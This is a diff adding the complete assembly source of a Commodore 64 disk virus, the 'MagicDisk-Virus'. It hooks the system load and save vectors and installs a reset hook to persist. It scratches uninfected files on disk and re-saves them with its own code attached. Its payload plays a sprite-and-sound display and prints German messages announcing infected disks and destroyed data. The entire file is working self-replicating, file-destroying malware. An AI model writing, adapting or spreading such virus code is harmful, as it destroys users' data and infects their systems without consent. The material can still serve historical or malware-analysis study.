@@ -1,0 +1,481 @@
+.ba $cbaf
+
+.eq status=$90
+.eq savecont=$f624
+.eq filelo=$bb
+.eq filehi=$bc
+.eq fileleng=$b7
+.eq setpar=$ffba
+.eq setnam=$ffbd
+.eq open=$ffc0
+.eq close=$ffc3
+.eq savecbm=$ffd8
+.eq strout=$ab1e
+.eq bsout=$ffd2
+
+.eq sid=54272
+.eq crsrflag=204
+.eq crsrline=214
+.eq vic=$d000
+
+.eq frqlo=data-1
+.eq frqhi=data-2
+.eq countlo=data-3
+.eq counthi=data-4
+.eq counter=data-5
+.eq lengnam=data-6
+.eq realend=ende-data+$0801
+
+;********************************
+; basic stub
+
+data      .by $15,$08,$0a,$00,$9e
+.tx "2071:md-virus!"
+.by 0,0,0
+
+;********************************
+; copy virus code to $cff0
+
+copyup    lda #$37
+          sta $01
+          ldx #$01
+          ldy #$08
+          stx $5f
+          sty $60
+          ldx #<(realend)
+          ldy #>(realend)
+          stx $5a
+          sty $5b
+          ldx #$f0
+          ldy #$cf
+          stx $58
+          sty $59
+          jsr $a3bf
+          jmp start
+
+;*******************************
+; copy infected program to $0801
+; init virus and run program
+
+start     lda #$36
+          sta $01
+
+          ldx #01
+          ldy #08
+          stx lab5+1
+          sty lab5+2
+          ldx #<(realend)
+          ldy #>(realend)
+          stx $fb
+          sty $fc
+          ldx $ae
+          ldy $af
+          stx $f9
+          sty $fa
+
+          ldy #00
+          ldx #00
+loop8     lda ($fb),y
+lab5      sta $0801,x
+          inx 
+          bne lab4
+          inc lab5+2
+lab4      jsr inccount
+          bcc loop8
+
+          ldy lab5+2
+          stx $ae
+          sty $af
+          stx $2d
+          sty $2e
+
+          lda #$37
+          sta $01
+
+          jsr init
+          jsr $a659
+          jmp $a7ae
+
+;********************************
+; code hooked into cbm80 nmi vector
+
+restore   jsr $fd15
+          jsr $fda3
+          jsr $e518
+          jsr init2
+          jmp ($a002)
+
+;********************************
+
+save1     jmp save
+
+;********************************
+; code hooked into cbm80 reset vector
+
+reset     stx $d016
+          jsr $fda3
+          jsr $fd50
+          jsr $fd15
+          jsr $ff5b
+          cli 
+          jsr init2
+          jmp ($a000)
+
+;********************************
+; code hooked into load vector
+
+load      pha 
+          lda filelo
+          sta $fb
+          lda filehi
+          sta $fc
+          ldy fileleng
+          sty lengnam
+loop2     lda ($fb),y
+          sta namebuff+2,y
+          dey 
+          bpl loop2
+          pla 
+
+          sta $93
+          lda #$00
+          sta $90
+          lda $ba
+          bne xf4b2
+xf4af     jmp $f713
+xf4b2     cmp #$03
+          beq xf4af
+          bcc xf533
+
+          ldy $b7
+          bne xf4bf
+          jmp $f710
+xf4bf     ldx $b9
+          jsr $f5af
+          lda #$60
+          sta $b9
+          jsr $f3d5
+          lda $ba
+          jsr $ed09
+          lda $b9
+          jsr $edc7
+          jsr $ee13
+          sta $ae
+
+          cmp #01
+          bne cbmload1
+
+          lda $90
+          lsr 
+          lsr 
+          bcs loaderror
+          jsr $ee13
+          sta $af
+
+          cmp #08
+          bne cbmload2
+          jsr $f4e5
+          bcc inftest
+          rts 
+;********************************
+loaderror jmp $f704
+xf533     jmp $f533
+cbmload1  jmp $f4da
+cbmload2  jmp $f4e5
+;********************************
+inftest   ldy #17
+loop7     lda $0801,y
+          cmp data,y
+          bne scratch
+          dey 
+          bpl loop7
+          jmp ($a002)
+
+scratch   lda #01
+          ldx #08
+          ldy #15
+          jsr setpar
+          lda lengnam
+          clc 
+          adc #02
+          ldx #<(namebuff)
+          ldy #>(namebuff)
+          jsr setnam
+          jsr open
+          lda #01
+          jsr close
+
+          ldy lengnam
+          lda namebuff+1,y
+          cmp #"*"
+          bne cont
+          dey 
+
+cont      tya 
+          ldx #<(namebuff)+2
+          ldy #>(namebuff)
+          jsr setnam
+          ldx #08
+          jsr setpar
+          ldx #01
+          ldy #08
+          stx $c1
+          sty $c2
+          ldx #00
+          jsr save
+          jmp saveerror
+
+;********************************
+; hook i/o vectors and install 
+; cbm80 hook
+
+init      lda #01
+          sta copy
+init2     ldy #03
+loop3     lda tab,y
+          sta $0330,y
+          dey 
+          bpl loop3
+
+          ldy #08
+loop4     lda cbm,y
+          sta $8000,y
+          dey 
+          bpl loop4
+
+          rts 
+
+;********************************
+xf659     jmp $f659
+copy      .by 0
+;********************************
+saveerror lda status
+          bne shit
+          rts 
+shit      lda #<(errortext)
+          ldy #>(errortext)
+          jmp strout
+
+;********************************
+; code hooked into save vector
+
+save      lda $ba
+          bne xf5f4
+xf5f1     jmp $f713
+xf5f4     cmp #$03
+          beq xf5f1
+          bcc xf659
+
+          lda #$61
+          sta $b9
+          ldy $b7
+          bne xf605
+          jmp $f710
+xf605     cpx #00
+          beq nosaving
+          jsr $f68f
+nosaving  jsr $f3d5
+          lda $ba
+          jsr $ed0c
+          lda $b9
+          jsr $edb9
+          ldy #$00
+          jsr $fb8e
+          lda $ac
+          cmp #01
+          beq lab1
+          ldy #01
+lab1      jsr $eddd
+          lda $ad
+          cmp #08
+          beq lab2
+          ldy #01
+lab2      jsr $eddd
+
+          cpy #01
+          bne virusok
+          ldy #00
+          jmp savecont
+
+virusok   lda #<(data)
+          sta $fb
+          lda #>(data)
+          sta $fc
+          lda #<(ende)
+          sta $f9
+          lda #>(ende)
+          sta $fa
+
+          ldy #00
+loop      lda ($fb),y
+          jsr $eddd
+          jsr inccount
+          bcc loop
+
+          jsr savecont
+          jsr saveerror
+
+          asl copy
+          bcs gag
+          rts
+
+;********************************
+; payload code
+
+gag       ldx #00
+          stx crsrflag
+          stx $d020
+          stx $d021
+          stx countlo
+          inx 
+          stx 646
+          stx vic+21
+;  {$a0}
+          lda #12
+          sta vic+39
+          lda #24
+          sta vic
+          lda #27
+          sta vic+1
+          lda #13
+          sta 2040
+
+          ldy #12
+          lda #00
+sloop4    sta 832,y
+          dey 
+          bpl sloop4
+
+          ldy #50
+sloop3    lda sprdat,y
+          sta 845,y
+          dey 
+          bpl sloop3
+
+          lda #13
+          jsr bsout
+          lda #32
+          jsr bsout
+;********************************
+calc      lda crsrline
+          clc 
+          adc #03
+          lsr 
+          ror countlo
+          clc 
+          adc #$60
+          sta counthi
+;********************************
+sound     lda #15
+          sta sid+24
+          sta counter
+          ldx #01
+          ldy #$78
+          stx sid
+          sty sid+1
+          stx frqlo
+          sty frqhi
+          ldx #$e0
+          ldy #$f0
+          stx sid+5
+          sty sid+6
+          lda #33
+          sta sid+4
+
+sloop2    ldy #01
+          jsr wait
+          dec frqlo
+          bne sl1
+          dec frqhi
+
+sl1       lda counthi
+          cmp frqhi
+          bcc sl5
+          bne sl6
+          lda countlo
+          cmp frqlo
+          bcc sl5
+sl6       dec counter
+          bpl sl5
+          inc vic+1
+          lda #15
+          sta counter
+
+sl5       lda frqhi
+          cmp #$60
+          beq bye
+          sta sid+1
+          lda frqlo
+          sta sid
+          jmp sloop2
+
+bye       sty sid+4
+          sty sid+24
+          lda #"{CBM-P}"
+          jsr bsout
+          sta crsrflag
+          ldy #$ff
+          jsr wait
+          sty vic+21
+          lda #<(warning)
+          ldy #>(warning)
+          jsr strout
+          jmp init
+;********************************
+wait      ldx #00
+sloop1    dex 
+          bne sloop1
+          dey 
+          bne sloop1
+          rts 
+;********************************
+inccount  inc $fb
+          bne lab3
+          inc $fc
+lab3      lda $fb
+          cmp $f9
+          bne weiter
+          lda $fc
+          cmp $fa
+          bne weiter
+          sec 
+          rts 
+
+weiter    clc 
+          rts 
+;********************************
+sprdat    .by 124,0,0,198,0,0,198,0,0,108,0,31,255,248
+.by 31,177,248,31,183,248,63,177,252,63,181,252,63,177,252,63,255,252,113
+.by 22,142,123,82,190,123,84,142,251,84,239,251,22,143,255,255,255,255
+
+;********************************
+; data for cbm80 hook
+cbm       .wo reset,restore
+          .tx "CBM80"
+
+; vectors for i/o hooks
+tab       .wo load,save
+
+errortext .by 13
+.tx "Der {rvon}MagicDisk-Virus{rvof} ist in diesem"
+.by13
+.tx "C64 !!! Soeben wurden Daten zerstoert !"
+.by13
+.tx "Bitte Programm auf einer anderen Disk"
+.by13
+.tx "abspeichern !!!"
+.by 13,14,0
+
+;********************************
+warning   .by 13
+.tx "Hallo du ! Dein 64er lebt ! Ein paar von"
+.by13
+.tx "deinen Disketten wurden infiziert mit"
+.by13
+.tx"dem {rvon}MagicDisk-Virus{rvof}..."
+.by 13,14,0
+
+;********************************
+namebuff  .tx "s:"
+ende      .by 0
+
